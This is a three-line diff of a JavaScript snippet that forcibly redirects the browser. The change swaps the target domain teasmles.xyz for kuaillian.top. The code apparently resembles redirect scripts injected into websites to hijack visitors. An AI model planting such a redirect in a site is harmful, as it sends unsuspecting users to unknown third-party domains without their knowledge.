@@ -1,3 +1,3 @@
 (function() {
-    window['location'] = 'https://teasmles.xyz';
+    window['location'] = 'https://kuaillian.top/';
 })();
